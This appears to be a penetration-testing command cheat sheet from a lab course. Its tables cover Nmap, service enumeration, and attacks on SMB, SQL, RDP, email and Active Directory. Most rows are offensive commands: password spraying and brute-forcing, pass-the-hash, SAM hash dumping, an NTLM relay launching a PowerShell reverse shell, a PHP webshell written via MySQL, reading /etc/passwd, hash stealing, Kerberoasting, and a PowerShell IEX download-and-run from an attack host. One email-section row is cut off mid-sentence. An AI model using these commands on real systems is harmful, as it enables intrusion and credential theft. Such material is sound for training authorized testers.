# Nmap

## Nmap Options

| Nmap Option       | Description                                                               |
|-------------------|---------------------------------------------------------------------------|
| 10.10.10.0/24     | Target network range.                                                     |
| -sn               | Disables port scanning.                                                   |
| -Pn               | Disables ICMP Echo Requests                                               |
| -n                | Disables DNS Resolution.                                                  |
| -PE               | Performs the ping scan by using ICMP Echo Requests against the target.    |
| --packet-trace    | Shows all packets sent and received.                                      |
| --reason          | Displays the reason for a specific result.                                |
| --disable-arp-ping| Disables ARP Ping Requests.                                               |
| --top-ports=<num> | Scans the specified top ports that have been defined as most frequent.    |
| -p-               | Scan all ports.                                                           |
| -p22-110          | Scan all ports between 22 and 110.                                        |
| -p22,25           | Scans only the specified ports 22 and 25.                                 |
| -F                | Scans top 100 ports.                                                      |
| -sS               | Performs a TCP SYN-Scan.                                                  |
| -sA               | Performs a TCP ACK-Scan.                                                  |
| -sU               | Performs a UDP Scan.                                                      |
| -sV               | Scans the discovered services for their versions.                         |
| -sC               | Perform a Script Scan with scripts that are categorized as "default".     |
| --script <script> | Performs a Script Scan by using the specified scripts.                    |
| -O                | Performs an OS Detection Scan to determine the OS of the target.          |
| -A                | Performs OS Detection, Service Detection, and traceroute scans.           |
| -D RND:5          | Sets the number of random Decoys that will be used to scan the target.    |
| -e                | Specifies the network interface that is used for the scan.                |
| -S 10.10.10.200   | Specifies the source IP address for the scan.                             |
| -g                | Specifies the source port for the scan.                                   |
| --dns-server <ns> | DNS resolution is performed by using a specified name server.             |

## Output Options

| Nmap Option       | Description                                                               |
|-------------------|---------------------------------------------------------------------------|
| -oA filename      | Stores the results in all available formats starting with the name of "filename". |
| -oN filename      | Stores the results in normal format with the name "filename".             |
| -oG filename      | Stores the results in "grepable" format with the name of "filename".      |
| -oX filename      | Stores the results in XML format with the name of "filename".             |

## Performance Options

| Nmap Option       | Description                                                               |
|-------------------|---------------------------------------------------------------------------|
| --max-retries <num>| Sets the number of retries for scans of specific ports.                  |
| --stats-every=5s  | Displays scan's status every 5 seconds.                                   |
| -v/-vv            | Displays verbose output during the scan.                                  |
| --initial-rtt-timeout 50ms | Sets the specified time value as initial RTT timeout.           |
| --max-rtt-timeout 100ms | Sets the specified time value as maximum RTT timeout.              |
| --min-rate 300    | Sets the number of packets that will be sent simultaneously.              |
| -T <0-5>          | Specifies the specific timing template.                                   |

# Footprinting

## General Commands

| Command | Description |
|---------|-------------|
| `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | Certificate transparency. |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done` | Scan each IP address in a list using Shodan. |

## Host-based Enumeration

### FTP

| Command | Description |
|---------|-------------|
| `ftp <FQDN/IP>` | Interact with the FTP service on the target. |
| `nc -nv <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `telnet <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | Interact with the FTP service on the target using encrypted connection. |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Download all available files on the target FTP server. |

### SMB

| Command | Description |
|---------|-------------|
| `smbclient -N -L //<FQDN/IP>` | Null session authentication on SMB. |
| `smbclient //<FQDN/IP>/<share>` | Connect to a specific SMB share. |
| `rpcclient -U "" <FQDN/IP>` | Interaction with the target using RPC. |
| `samrdump.py <FQDN/IP>` | Username enumeration using Impacket scripts. |
| `smbmap -H <FQDN/IP>` | Enumerating SMB shares. |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |
| `enum4linux-ng.py <FQDN/IP> -A` | SMB enumeration using enum4linux. |

### NFS

| Command | Description |
|---------|-------------|
| `showmount -e <FQDN/IP>` | Show available NFS shares. |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount the specific NFS share. |
| `umount ./target-NFS` | Unmount the specific NFS share. |

### DNS

| Command | Description |
|---------|-------------|
| `dig ns <domain.tld> @<nameserver>` | NS request to the specific nameserver. |
| `dig any <domain.tld> @<nameserver>` | ANY request to the specific nameserver. |
| `dig axfr <domain.tld> @<nameserver>` | AXFR request to the specific nameserver. |
| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | Subdomain brute forcing. |

### SMTP

| Command | Description |
|---------|-------------|
| `telnet <FQDN/IP> 25` | Interact with the SMTP service. |

### IMAP/POP3

| Command | Description |
|---------|-------------|
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. |
| `openssl s_client -connect <FQDN/IP>:imaps` | Connect to the IMAPS service. |
| `openssl s_client -connect <FQDN/IP>:pop3s` | Connect to the POP3s service. |

### SNMP

| Command | Description |
|---------|-------------|
| `snmpwalk -v2c -c <community string> <FQDN/IP>` | Querying OIDs using snmpwalk. |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |
| `braa <community string>@<FQDN/IP>:.1.*` | Bruteforcing SNMP service OIDs. |

### MySQL

| Command | Description |
|---------|-------------|
| `mysql -u <user> -p<password> -h <FQDN/IP>` | Login to the MySQL server. |

### MSSQL

| Command | Description |
|---------|-------------|
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |

### IPMI

| Command | Description |
|---------|-------------|
| `msf6 auxiliary(scanner/ipmi/ipmi_version)` | IPMI version detection. |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes. |

### Linux Remote Management

| Command | Description |
|---------|-------------|
| `ssh-audit.py <FQDN/IP>` | Remote security audit against the target SSH service. |
| `ssh <user>@<FQDN/IP>` | Log in to the SSH server using the SSH client. |
| `ssh -i private.key <user>@<FQDN/IP>` | Log in to the SSH server using private key. |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication. |

### Windows Remote Management

| Command | Description |
|---------|-------------|
| `rdp-sec-check.pl <FQDN/IP>` | Check the security settings of the RDP service. |
| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>` | Log in to the RDP server from Linux. |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>` | Log in to the WinRM server. |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service. |

### Oracle TNS

| Command | Description |
|---------|-------------|
| `./odat.py all -s <FQDN/IP>` | Perform a variety of scans to gather information about the Oracle database services and its components. |
| `sqlplus <user>/<pass>@<FQDN/IP>/<db>` | Log in to the Oracle database. |
| `./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt` | Upload a file with Oracle RDBMS. |

# Attacking Common Services

## Attacking FTP

| Command | Description |
|---------|-------------|
| `ftp 192.168.2.142` | Connecting to the FTP server using the ftp client. |
| `nc -v 192.168.2.142 21` | Connecting to the FTP server using netcat. |
| `hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142` | Brute-forcing the FTP service. |

## Attacking SMB

| Command | Description |
|---------|-------------|
| `smbclient -N -L //10.129.14.128` | Null-session testing against the SMB service. |
| `smbmap -H 10.129.14.128` | Network share enumeration using smbmap. |
| `smbmap -H 10.129.14.128 -r notes` | Recursive network share enumeration using smbmap. |
| `smbmap -H 10.129.14.128 --download "notes\note.txt"` | Download a specific file from the shared folder. |
| `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"` | Upload a specific file to the shared folder. |
| `rpcclient -U'%' 10.10.110.17` | Null-session with the rpcclient. |
| `./enum4linux-ng.py 10.10.11.45 -A -C` | Automated enumeration of the SMB service using enum4linux-ng. |
| `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'` | Password spraying against different users from a list. |
| `impacket-psexec administrator:'Password123!'@10.10.110.17` | Connect to the SMB service using the impacket-psexec. |
| `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` | Execute a command over the SMB service using crackmapexec. |
| `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users` | Enumerating Logged-on users. |
| `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam` | Extract hashes from the SAM database. |
| `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE` | Use the Pass-The-Hash technique to authenticate on the target host. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146` | Dump the SAM database using impacket-ntlmrelayx. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>` | Execute a PowerShell based reverse shell using impacket-ntlmrelayx. |

## Attacking SQL Databases

| Command | Description |
|---------|-------------|
| `mysql -u julio -pPassword123 -h 10.129.20.13` | Connecting to the MySQL server. |
| `sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30` | Connecting to the MSSQL server. |
| `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h` | Connecting to the MSSQL server from Linux. |
| `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h` | Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server. |
| `mysql> SHOW DATABASES;` | Show all available databases in MySQL. |
| `mysql> USE htbusers;` | Select a specific database in MySQL. |
| `mysql> SHOW TABLES;` | Show all available tables in the selected database in MySQL. |
| `mysql> SELECT * FROM users;` | Select all available entries from the "users" table in MySQL. |
| `sqlcmd> SELECT name FROM master.dbo.sysdatabases` | Show all available databases in MSSQL. |
| `sqlcmd> USE htbusers` | Select a specific database in MSSQL. |
| `sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES` | Show all available tables in the selected database in MSSQL. |
| `sqlcmd> SELECT * FROM users` | Select all available entries from the "users" table in MSSQL. |
| `sqlcmd> EXECUTE sp_configure 'show advanced options', 1` | To allow advanced options to be changed. |
| `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1` | To enable the xp_cmdshell. |
| `sqlcmd> RECONFIGURE` | To be used after each sp_configure command to apply the changes. |
| `sqlcmd> xp_cmdshell 'whoami'` | Execute a system command from MSSQL server. |
| `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'` | Create a file using MySQL. |
| `mysql> show variables like "secure_file_priv";` | Check if the secure file privileges are empty to read locally stored files on the system. |
| `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents` | Read local files in MSSQL. |
| `mysql> select LOAD_FILE("/etc/passwd");` | Read local files in MySQL. |
| `sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'` | Hash stealing using the xp_dirtree command in MSSQL. |
| `sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'` | Hash stealing using the xp_subdirs command in MSSQL. |
| `sqlcmd> SELECT srvname, isremote FROM sysservers` | Identify linked servers in MSSQL. |
| `sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]` | Identify the user and its privileges used for the remote connection in MSSQL. |

## Attacking RDP

| Command | Description |
|---------|-------------|
| `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'` | Password spraying against the RDP service. |
| `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp` | Brute-forcing the RDP service. |
| `rdesktop -u admin -p password123 192.168.2.143` | Connect to the RDP service using rdesktop in Linux. |
| `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}` | Impersonate a user without its password. |
| `net start sessionhijack` | Execute the RDP session hijack. |
| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | Enable "Restricted Admin Mode" on the target Windows host. |
| `xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA` | Use the Pass-The-Hash technique to login on the target host without a password. |

## Attacking DNS

| Command | Description |
|---------|-------------|
| `dig AXFR @ns1.inlanefreight.htb inlanefreight.htb` | Perform an AXFR zone transfer attempt against a specific name server. |
| `subfinder -d inlanefreight.com -v` | Brute-forcing subdomains. |
| `host support.inlanefreight.com` | DNS lookup for the specified subdomain. |

## Attacking Email Services

| Command | Description |
|---------|-------------|
| `host -t MX microsoft.com` | DNS lookup for mail servers for the specified domain. |
| `dig mx inlanefreight.com \| grep "MX" \| grep -v ";"` | DNS lookup for mail servers for the specified domain. |
| `host -t A mail1.inlanefreight.htb.` | DNS lookup of the IPv4 address for the specified subdomain. |
| `telnet 10.10.110.20 25` | Connect to the SMTP server. |
| `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7` | SMTP user enumeration using the RCPT command against the specified host. |
| `python3 o365spray.py --validate --domain msplaintext.xyz` | Verify the usage

# Active Directory

## General Commands

| Command | Description |
|---------|-------------|
| `nslookup ns1.inlanefreight.com` | Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host. |
| `sudo tcpdump -i ens224` | Used to start capturing network packets on the network interface proceeding the -i option on a Linux-based host. |
| `sudo responder -I ens224 -A` | Used to start responding to & analyzing LLMNR, NBT-NS and MDNS queries on the interface specified proceeding the -I option and operating in Passive Analysis mode which is activated using -A. Performed from a Linux-based host. |
| `fping -asgq 172.16.5.0/23` | Performs a ping sweep on the specified network segment from a Linux-based host. |
| `sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum` | Performs an nmap scan with OS detection, version detection, script scanning, and traceroute enabled (-A) based on a list of hosts (hosts.txt) specified in the file proceeding -iL. Then outputs the scan results to the file specified after the -oN option. Performed from a Linux-based host. |
| `sudo git clone https://github.com/ropnop/kerbrute.git` | Uses git to clone the kerbrute tool from a Linux-based host. |
| `make help` | Used to list compiling options that are possible with make from a Linux-based host. |
| `sudo make all` | Used to compile a Kerbrute binary for multiple OS platforms and CPU architectures. |
| `./kerbrute_linux_amd64` | Used to test the chosen compiled Kerbrute binary from a Linux-based host. |
| `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute` | Used to move the Kerbrute binary to a directory that can be set to be in a Linux user's path. Making it easier to use the tool. |
| `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dc using a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host. |

## LLMNR/NTB-NS Poisoning

| Command | Description |
|---------|-------------|
| `responder -h` | Used to display the usage instructions and various options available in Responder from a Linux-based host. |
| `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` | Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (forend_ntlmv2). The cracking is done based on a specified wordlist. |
| `Import-Module .\Inveigh.ps1` | Using the Import-Module PowerShell cmdlet to import the Windows-based tool Inveigh.ps1. |
| `(Get-Command Invoke-Inveigh).Parameters` | Used to output many of the options & functionality available with Invoke-Inveigh. Performed from a Windows-based host. |
| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y` | Starts Inveigh on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file. |
| `.\Inveigh.exe` | Starts the C# implementation of Inveigh from a Windows-based host. |
| `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}` | PowerShell script used to disable NBT-NS on a Windows host. |

## Password Spraying & Password Policies

| Command | Description |
|---------|-------------|
| `#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}} do echo $x; done` | Bash script used to generate 16,079,616 possible username combinations from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol` | Uses CrackMapExec and valid credentials (avazquez:Password123) to enumerate the password policy (--pass-pol) from a Linux-based host. |
| `rpcclient -U "" -N 172.16.5.5` | Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host. |
| `rpcclient $> querydominfo` | Uses rpcclient to enumerate the password policy in a target Windows domain from a Linux-based host. |
| `enum4linux -P 172.16.5.5` | Uses enum4linux to enumerate the password policy (-P) in a target Windows domain from a Linux-based host. |
| `enum4linux-ng -P 172.16.5.5 -oA ilfreight` | Uses enum4linux-ng to enumerate the password policy (-P) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the -oA option. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength` | Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host. |
| `net accounts` | Used to enumerate the password policy in a Windows domain from a Windows-based host. |
| `Import-Module .\PowerView.ps1` | Uses the Import-Module cmdlet to import the PowerView.ps1 tool from a Windows-based host. |
| `Get-DomainPolicy` | Used to enumerate the password policy in a target Windows domain from a Windows-based host. |
| `enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"` | Uses enum4linux to discover user accounts in a target Windows domain, then leverages grep to filter the output to just display the user from a Linux-based host. |
| `rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser` | Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 --users` | Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "` | Uses ldapsearch to discover users in a target Windows domain, then filters the output using grep to show only the sAMAccountName from a Linux-based host. |
| `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U` | Uses the python tool windapsearch.py to discover users in a target Windows domain from a Linux-based host. |
| `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done` | Bash one-liner used to perform a password spraying attack using rpcclient and a list of users (valid_users.txt) from a Linux-based host. It also filters out failed attempts to make the output cleaner. |
| `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1` | Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +` | Uses CrackMapExec and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using grep. |
| `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123` | Uses CrackMapExec to validate a set of credentials from a Linux-based host. |
| `sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +` | Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep. |
| `Import-Module .\DomainPasswordSpray.ps1` | Used to import the PowerShell-based tool DomainPasswordSpray.ps1 from a Windows-based host. |
| `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue` | Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host. |

## Enumerating Security Controls

| Command | Description |
|---------|-------------|
| `Get-MpComputerStatus` | PowerShell cmdlet used to check the status of Windows Defender Anti-Virus from a Windows-based host. |
| `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections` | PowerShell cmdlet used to view AppLocker policies from a Windows-based host. |
| `$ExecutionContext.SessionState.LanguageMode` | PowerShell script used to discover the PowerShell Language Mode being used on a Windows-based host. Performed from a Windows-based host. |
| `Find-LAPSDelegatedGroups` | A LAPSToolkit function that discovers LAPS Delegated Groups from a Windows-based host. |
| `Find-AdmPwdExtendedRights` | A LAPSToolkit function that checks the rights on each computer with LAPS enabled for any groups with read access and users with All Extended Rights. Performed from a Windows-based host. |
| `Get-LAPSComputers` | A LAPSToolkit function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host. |

## Credentialed Enumeration

| Command | Description |
|---------|-------------|
| `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25` | Connects to a Windows target using valid credentials. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users` | Authenticates with a Windows target over smb using valid credentials and attempts to discover more users (--users) in a target Windows domain. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups` | Authenticates with a Windows target over smb using valid credentials and attempts to discover groups (--groups) in a target Windows domain. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users` | Authenticates with a Windows target over smb using valid credentials and attempts to check for a list of logged on users (--loggedon-users) on the target Windows host. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares` | Authenticates with a Windows target over smb using valid credentials and attempts to discover any smb shares (--shares). Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share` | Authenticates with a Windows target over smb using valid credentials and utilizes the CrackMapExec module (-M) spider_plus to go through each readable share (Dev-share) and list all readable files. The results are outputted in JSON. Performed from a Linux-based host. |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5` | Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (-H). Performed from a Linux-based host. |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only` | Enumerates the target Windows domain using valid credentials and performs a recursive listing (-R) of the specified share (SYSVOL) and only outputs a list of directories (--dir-only) in the share. Performed from a Linux-based host. |
| `rpcclient $> queryuser 0x457` | Enumerates a target user account in a Windows domain using its relative identifier (0x457). Performed from a Linux-based host. |
| `rpcclient $> enumdomusers` | Discovers user accounts in a target Windows domain and their associated relative identifiers (rid). Performed from a Linux-based host. |
| `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125` | Impacket tool used to connect to the CLI of a Windows target via the ADMIN$ administrative share with valid credentials. Performed from a Linux-based host. |
| `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5` | Impacket tool used to connect to the CLI of a Windows target via WMI with valid credentials. Performed from a Linux-based host. |
| `windapsearch.py -h` | Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da` | Used to enumerate the domain admins group (--da) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU` | Used to perform a recursive search (-PU) for users with nested permissions using valid credentials. Performed from a Linux-based host. |
| `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all` | Executes the python implementation of BloodHound (bloodhound.py) with valid credentials and specifies a name server (-ns) and target Windows domain (inlanefreight.local) as well as runs all checks (-c all). Runs using valid credentials. Performed from a Linux-based host. |

## Enumeration by Living Off the Land

| Command | Description |
|---------|-------------|
| `Get-Module` | PowerShell cmdlet used to list all available modules, their version and command options from a Windows-based host. |
| `Import-Module ActiveDirectory` | Loads the Active Directory PowerShell module from a Windows-based host. |
| `Get-ADDomain` | PowerShell cmdlet used to gather Windows domain information from a Windows-based host. |
| `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` | PowerShell cmdlet used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host. |
| `Get-ADTrust -Filter *` | PowerShell cmdlet used to enumerate any trust relationships in a target Windows domain and filters by any (-Filter *). Performed from a Windows-based host. |
| `Get-ADGroup -Filter * | select name` | PowerShell cmdlet used to enumerate groups in a target Windows domain and filters by the name of the group (select name). Performed from a Windows-based host. |
| `Get-ADGroup -Identity "Backup Operators"` | PowerShell cmdlet used to search for a specific group (-Identity "Backup Operators"). Performed from a Windows-based host. |
| `Get-ADGroupMember -Identity "Backup Operators"` | PowerShell cmdlet used to discover the members of a specific group (-Identity "Backup Operators"). Performed from a Windows-based host. |
| `Export-PowerViewCSV` | PowerView script used to append results to a CSV file. Performed from a Windows-based host. |
| `ConvertTo-SID` | PowerView script used to convert a User or Group name to its SID. Performed from a Windows-based host. |
| `Get-DomainSPNTicket` | PowerView script used to request the kerberos ticket for a specified service principal name (SPN). Performed from a Windows-based host. |
| `Get-Domain` | PowerView script used to return the AD object for the current (or specified) domain. Performed from a Windows-based host. |
| `Get-DomainController` | PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host. |
| `Get-DomainUser` | PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host. |
| `Get-DomainComputer` | PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host. |
| `Get-DomainGroup` | PowerView script used to return all groups or specific group objects in AD. Performed from a Windows-based host. |
| `Get-DomainOU` | PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host. |
| `Find-InterestingDomainAcl` | PowerView script used to find object ACLs in the domain with modification rights set to non-built in objects. Performed from a Windows-based host. |
| `Get-DomainGroupMember` | PowerView script used to return the members of a specific domain group. Performed from a Windows-based host. |
| `Get-DomainFileServer` | PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host. |
| `Get-DomainDFSShare` | PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host. |
| `Get-DomainGPO` | PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host. |
| `Get-DomainPolicy` | PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host. |
| `Get-NetLocalGroup` | PowerView script used to enumerate local groups on a local or remote machine. Performed from a Windows-based host. |
| `Get-NetLocalGroupMember` | PowerView script used to enumerate members of a specific local group. Performed from a Windows-based host. |
| `Get-NetShare` | PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host. |
| `Get-NetSession` | PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host. |
| `Test-AdminAccess` | PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host. |
| `Find-DomainUserLocation` | PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host. |
| `Find-DomainShare` | PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host. |
| `Find-InterestingDomainShareFile` | PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host. |
| `Find-LocalAdminAccess` | PowerView script used to find machines on the local domain where the current user has local administrator access. Performed from a Windows-based host. |
| `Get-DomainTrust` | PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host. |
| `Get-ForestTrust` | PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host. |
| `Get-DomainForeignUser` | PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host. |
| `Get-DomainForeignGroupMember` | PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host. |
| `Get-DomainTrustMapping` | PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host. |
| `Get-DomainGroupMember -Identity "Domain Admins" -Recurse` | PowerView script used to list all the members of a target group ("Domain Admins") through the use of the recurse option (-Recurse). Performed from a Windows-based host. |
| `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName` | PowerView script used to find users on the target Windows domain that have the Service Principal Name set. Performed from a Windows-based host. |
| `.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data` | Runs a tool called Snaffler against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host. |

## Transferring Files

| Command | Description |
|---------|-------------|
| `sudo python3 -m http.server 8001` | Starts a python web server for quick hosting of files. Performed from a Linux-based host. |
| `"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"` | PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host. |
| `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/` | Starts an impacket SMB server for quick hosting of a file. Performed from a Windows-based host. |

## Kerberoasting

| Command | Description |
|---------|-------------|
| `sudo python3 -m pip install .` | Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host. |
| `GetUserSPNs.py -h` | Impacket tool used to display the options and functionality of GetUserSPNs.py from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday` | Impacket tool used to get a list of SPNs on the target Windows domain from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request` | Impacket tool used to download/request (-request) all TGS tickets for offline processing from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev` | Impacket tool used to download/request (-request-user) a TGS ticket for a specific user account (sqldev) from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs` | Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) from a Linux-based host. |
